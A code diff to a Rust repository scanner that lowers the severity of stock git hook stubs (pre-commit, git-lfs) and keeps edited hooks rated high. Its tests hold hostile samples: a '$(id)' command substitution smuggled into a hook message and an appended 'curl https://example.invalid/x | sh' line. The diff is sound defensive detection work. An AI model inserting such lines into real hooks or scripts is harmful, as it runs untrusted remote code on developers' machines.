@@ -164,8 +164,10 @@ fn script_pairs(v: &Value) -> Vec<(String, String)> {
 /// Raises each `autorun.gitattributes-filter` finding to HIGH when `f` is a text file (not the
 /// attributes file itself) that tells the reader to set up one of its filters with
 /// `git config filter.<name>.…`. The orchestrator calls this for every text file once the
-/// attributes finding exists.
+/// attributes finding exists. It is also offered every git hook file, and lowers the finding of
+/// a stock hook stub (`lower_hook_stubs`).
 pub(crate) fn raise_gitattributes_filters(f: &FileCtx, findings: &mut [Finding]) {
+    lower_hook_stubs(f, findings);
     let Some(text) = f.text else {
         return;
     };
@@ -542,6 +544,11 @@ fn git_hook_name(path: &str) -> Option<&str> {
         .or_else(|| path.find(MARK).map(|i| &path[i + MARK.len()..]))
 }
 
+/// True when `path` is a hook file `entry_findings` rates.
+pub(crate) fn is_git_hook(path: &str) -> bool {
+    git_hook_name(path).is_some_and(|h| !h.is_empty() && !h.ends_with(".sample"))
+}
+
 /// Lowers `autorun.git-hooks` to LOW for the file `f` when it is the stock stub that pre-commit,
 /// git-lfs or lefthook writes. The orchestrator offers each text file once the entry findings
 /// exist. A stub that has been edited, or any other hook, stays HIGH.
@@ -580,10 +587,15 @@ static PRE_COMMIT_PYTHON: LazyLock<Regex> = LazyLock::new(|| {
 static PRE_COMMIT_ARGS: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"^ARGS=\(hook-impl( --[\w-]+(=[\w./-]+)?)+\)$").expect("pattern compiles")
 });
+/// The guard line git-lfs writes: older versions with `echo`, newer ones with `printf` and a
+/// longer message.
 static LFS_GUARD: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(
-        r#"^command -v git-lfs >/dev/null 2>&1 \|\| \{ echo >&2 "[^"`$;|&<>]*"; exit 2; \}$"#,
-    )
+    Regex::new(concat!(
+        r#"^command -v git-lfs >/dev/null 2>&1 \|\| \{ (?:"#,
+        r#"echo >&2 "[^"`$|&<>]*""#,
+        r#"|printf >&2 "\\n%s\\n\\n" "[^"`$|&<>]*""#,
+        r#"); exit 2; \}$"#,
+    ))
     .expect("pattern compiles")
 });
 
@@ -3725,6 +3737,40 @@ call post.bat</PreBuildEvent>
         assert_eq!(out.len(), 1, "{path}");
         lower_hook_stubs(&ctx(path, text), &mut out);
         out[0].severity
+    }
+
+    const LFS_PRINTF_STUB: &str = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'post-checkout' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";
+
+    #[test]
+    fn the_newer_git_lfs_stub_is_low_and_a_command_in_its_message_is_not() {
+        assert_eq!(
+            hook_severity(".git/hooks/post-checkout", LFS_PRINTF_STUB),
+            Severity::Low
+        );
+        let sneaky = LFS_PRINTF_STUB.replace("usually '.git/hooks'", "usually '$(id)'");
+        assert_eq!(
+            hook_severity(".git/hooks/post-checkout", &sneaky),
+            Severity::High
+        );
+        let appended = format!("{LFS_PRINTF_STUB}curl https://example.invalid/x | sh\n");
+        assert_eq!(
+            hook_severity(".git/hooks/post-checkout", &appended),
+            Severity::High
+        );
+    }
+
+    #[test]
+    fn a_hook_file_is_offered_through_raise_gitattributes_filters() {
+        // The orchestrator offers every hook file to this one function.
+        let mut out = Vec::new();
+        entry_findings(&[".git/hooks/pre-commit"], &mut out);
+        let hook = ctx(".git/hooks/pre-commit", PRE_COMMIT_STUB);
+        raise_gitattributes_filters(&hook, &mut out);
+        assert_eq!(out[0].severity, Severity::Low);
+        assert!(is_git_hook(".git/hooks/pre-commit"));
+        assert!(is_git_hook("sub/.git/hooks/pre-push"));
+        assert!(!is_git_hook(".git/hooks/pre-push.sample"));
+        assert!(!is_git_hook(".git/config"));
     }
 
     #[test]
